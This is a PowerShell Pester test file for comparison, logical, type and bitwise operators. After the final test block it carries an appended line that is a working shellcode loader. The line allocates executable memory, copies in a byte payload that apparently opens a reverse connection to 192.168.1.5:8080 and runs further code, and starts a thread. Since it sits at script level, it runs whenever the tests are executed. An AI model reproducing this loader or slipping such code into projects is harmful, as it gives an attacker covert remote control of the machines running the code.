

Describe "ComparisonOperator" -tag "CI" {

    It "Should be <result> for <lhs> <operator> <rhs>" -TestCases @(
        @{lhs = 1; operator = "-lt"; rhs = 2; result = $true},
        @{lhs = 1; operator = "-gt"; rhs = 2; result = $false},
        @{lhs = 1; operator = "-le"; rhs = 2; result = $true},
        @{lhs = 1; operator = "-le"; rhs = 1; result = $true},
        @{lhs = 1; operator = "-ge"; rhs = 2; result = $false},
        @{lhs = 1; operator = "-ge"; rhs = 1; result = $true},
        @{lhs = 1; operator = "-eq"; rhs = 1; result = $true},
        @{lhs = 1; operator = "-ne"; rhs = 2; result = $true},
        @{lhs = "'abc'"; operator = "-ceq"; rhs = "'abc'"; result = $true}
        @{lhs = "'abc'"; operator = "-ceq"; rhs = "'Abc'"; result = $false}
        @{lhs = 1; operator = "-and"; rhs = 1; result = $true},
        @{lhs = 1; operator = "-and"; rhs = 0; result = $false},
        @{lhs = 0; operator = "-and"; rhs = 0; result = $false},
        @{lhs = 1; operator = "-or"; rhs = 1; result = $true},
        @{lhs = 1; operator = "-or"; rhs = 0; result = $true},
        @{lhs = 0; operator = "-or"; rhs = 0; result = $false}
    ) {
        param($lhs, $operator, $rhs, $result)
	    Invoke-Expression "$lhs $operator $rhs" | Should -Be $result
    }

	It "Should be <result> for <operator> <rhs>" -TestCases @(
        @{operator = "-not "; rhs = "1"; result = $false},
        @{operator = "-not "; rhs = "0"; result = $true},
        @{operator = "! "; rhs = "1"; result = $false},
        @{operator = "! "; rhs = "0"; result = $true},
        @{operator = "!"; rhs = "1"; result = $false},
        @{operator = "!"; rhs = "0"; result = $true}
    ) {
        param($operator, $rhs, $result)
        Invoke-Expression "$operator$rhs" | Should -Be $result
    }

	It "Should be <result> for <lhs> <operator> <rhs>" -TestCases @(
        @{lhs = "'Hello'"; operator = "-contains"; rhs = "'Hello'"; result = $true},
        @{lhs = "'Hello'"; operator = "-notcontains"; rhs = "'Hello'"; result = $false},
        @{lhs = "'Hello','world'"; operator = "-ccontains"; rhs = "'hello'"; result = $false},
        @{lhs = "'Hello','world'"; operator = "-ccontains"; rhs = "'Hello'"; result = $true}
        @{lhs = "'Hello','world'"; operator = "-cnotcontains"; rhs = "'Hello'"; result = $false}
        @{lhs = "'Hello world'"; operator = "-match"; rhs = "'Hello*'"; result = $true},
        @{lhs = "'Hello world'"; operator = "-like"; rhs = "'Hello*'"; result = $true},
        @{lhs = "'Hello world'"; operator = "-notmatch"; rhs = "'Hello*'"; result = $false},
        @{lhs = "'Hello world'"; operator = "-notlike"; rhs = "'Hello*'"; result = $false}
    ) {
        param($lhs, $operator, $rhs, $result)
        Invoke-Expression "$lhs $operator $rhs" | Should -Be $result
    }

    It "Should return error if right hand is not a valid type: 'hello' <operator> <type>" -TestCases @(
        @{operator = "-is"; type = "'foo'";    expectedError='RuntimeException,Microsoft.PowerShell.Commands.InvokeExpressionCommand'},
        @{operator = "-isnot"; type = "'foo'"; expectedError='RuntimeException,Microsoft.PowerShell.Commands.InvokeExpressionCommand'},
        @{operator = "-is"; type = "[foo]";    expectedError='TypeNotFound,Microsoft.PowerShell.Commands.InvokeExpressionCommand'},
        @{operator = "-isnot"; type = "[foo]"; expectedError='TypeNotFound,Microsoft.PowerShell.Commands.InvokeExpressionCommand'}
    ) {
        param($operator, $type, $expectedError)
        { Invoke-Expression "'Hello' $operator $type" } | Should -Throw -ErrorId $expectedError
    }

    It "Should succeed in comparing type: <lhs> <operator> <rhs>" -TestCases @(
        @{lhs = '[pscustomobject]@{foo=1}'; operator = '-is'; rhs = '[pscustomobject]'},
        @{lhs = '[pscustomobject]@{foo=1}'; operator = '-is'; rhs = '[psobject]'},
        @{lhs = '"hello"'; operator = '-is'; rhs = "[string]"},
        @{lhs = '"hello"'; operator = '-is'; rhs = "[system.string]"},
        @{lhs = '100'; operator = '-is'; rhs = "[int]"},
        @{lhs = '100'; operator = '-is'; rhs = "[system.int32]"},
        @{lhs = '"hello"'; operator = '-isnot'; rhs = "[int]"}
    ) {
        param($lhs, $operator, $rhs)
        Invoke-Expression "$lhs $operator $rhs" | Should -BeTrue
    }

    It "Should fail in comparing type: <lhs> <operator> <rhs>" -TestCases @(
        @{lhs = '[pscustomobject]@{foo=1}'; operator = '-is'; rhs = '[string]'},
        @{lhs = '"hello"'; operator = '-is'; rhs = "[psobject]"},
        @{lhs = '"hello"'; operator = '-isnot'; rhs = "[string]"}
    ) {
        param($lhs, $operator, $rhs)
        Invoke-Expression "$lhs $operator $rhs" | Should -BeFalse
    }
}

Describe "Bytewise Operator" -tag "CI" {

    It "Test -bor on enum with [byte] as underlying type" {
        $result = [System.Security.AccessControl.AceFlags]::ObjectInherit -bxor `
                  [System.Security.AccessControl.AceFlags]::ContainerInherit
        $result.ToString() | Should -BeExactly "ObjectInherit, ContainerInherit"
    }

    It "Test -bor on enum with [int] as underlying type" {
        $result = [System.Management.Automation.CommandTypes]::Alias -bor `
                  [System.Management.Automation.CommandTypes]::Application
        $result.ToString() | Should -BeExactly "Alias, Application"
    }

    It "Test -band on enum with [byte] as underlying type" {
        $result = [System.Security.AccessControl.AceFlags]::ObjectInherit -band `
                  [System.Security.AccessControl.AceFlags]::ContainerInherit
        $result.ToString() | Should -BeExactly "None"
    }

    It "Test -band on enum with [int] as underlying type" {
        $result = [System.Management.Automation.CommandTypes]::Alias -band `
                  [System.Management.Automation.CommandTypes]::All
        $result.ToString() | Should -BeExactly "Alias"
    }

    It "Test -bxor on enum with [byte] as underlying type" {
        $result = [System.Security.AccessControl.AceFlags]::ObjectInherit -bxor `
                  [System.Security.AccessControl.AceFlags]::ContainerInherit
        $result.ToString() | Should -BeExactly "ObjectInherit, ContainerInherit"
    }

    It "Test -bxor on enum with [int] as underlying type" {
        $result = [System.Management.Automation.CommandTypes]::Alias -bxor `
                  [System.Management.Automation.CommandTypes]::Application
        $result.ToString() | Should -BeExactly "Alias, Application"
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

